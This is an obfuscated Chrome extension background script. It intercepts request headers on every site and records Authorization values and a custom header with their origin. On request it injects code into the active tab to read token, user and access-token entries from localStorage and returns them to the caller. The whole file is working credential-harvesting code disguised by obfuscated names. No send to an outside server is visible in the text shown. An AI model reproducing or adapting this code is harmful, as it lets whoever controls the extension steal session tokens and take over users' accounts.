const recordedRequests = [];
chrome.webRequest.onBeforeSendHeaders.addListener(_0x29ee5b => {
  if (_0x29ee5b.requestHeaders) {
    let _0x386dbf = "";
    try {
      _0x386dbf = new URL(_0x29ee5b.initiator).origin;
    } catch (_0x3c24a2) {
      console.error("Invalid URL:", _0x29ee5b.initiator);
      return;
    }
    let _0x2eb84c = {};
    _0x29ee5b.requestHeaders.forEach(_0x51fe1c => {
      if (_0x51fe1c.name.toLowerCase() === "authorization") {
        _0x2eb84c.authorization = _0x51fe1c.value;
      } else if (_0x51fe1c.name.toLowerCase() === "x-custom-header") {
        _0x2eb84c["x-custom-header"] = _0x51fe1c.value;
      }
    });
    if (Object.keys(_0x2eb84c).length > 0) {
      const _0x26a00b = {
        topLevelUrl: _0x386dbf,
        iframeUrl: _0x29ee5b.url,
        method: _0x29ee5b.method,
        ..._0x2eb84c
      };
      recordedRequests.length = 0;
      recordedRequests.push(_0x26a00b);
      chrome.storage.local.set({
        recordedRequests: recordedRequests
      });
      console.log("Request Headers have been logged:", _0x26a00b);
    }
  }
}, {
  urls: ["<all_urls>"]
}, ["requestHeaders"]);
chrome.webRequest.onBeforeRequest.addListener(_0x209992 => {}, {
  urls: ["<all_urls>"]
}, ["requestBody"]);
chrome.runtime.onMessage.addListener((_0x3008d2, _0x15fc82, _0x1f2ec8) => {
  console.log("Message received:", _0x3008d2, _0x15fc82);
  if (_0x3008d2.action === "getRecordedRequests") {
    chrome.storage.local.get("recordedRequests", _0x3d4fc7 => {
      chrome.storage.local.remove("recordedRequests");
      _0x1f2ec8(_0x3d4fc7.recordedRequests);
    });
    return true;
  }
  if (_0x3008d2.action === "getTokenFromLocalStorage") {
    chrome.tabs.query({
      active: true,
      currentWindow: true
    }, _0x160150 => {
      chrome.scripting.executeScript({
        target: {
          tabId: _0x160150[0].id
        },
        func: () => {
          let _0x1d6cbe = {};
          const _0xf3e3d0 = ["tokenKey", "token", "user", "USER_DATA"];
          _0xf3e3d0.forEach(_0x2848f8 => {
            const _0x3b9474 = localStorage.getItem(_0x2848f8);
            if (_0x3b9474) {
              try {
                _0x1d6cbe[_0x2848f8] = JSON.parse(_0x3b9474);
              } catch (_0x53f22d) {
                _0x1d6cbe[_0x2848f8] = _0x3b9474;
              }
            }
          });
          if (_0x1d6cbe.USER_DATA && typeof _0x1d6cbe.USER_DATA === "object" && _0x1d6cbe.USER_DATA.accessToken) {
            _0x1d6cbe.accessToken = _0x1d6cbe.USER_DATA.accessToken;
          }
          return _0x1d6cbe;
        }
      }, _0x52604f => {
        if (chrome.runtime.lastError) {
          console.error("Error executing script:", chrome.runtime.lastError.message);
        } else {
          _0x1f2ec8(_0x52604f[0]?.["result"]);
        }
      });
    });
    return true;
  }
});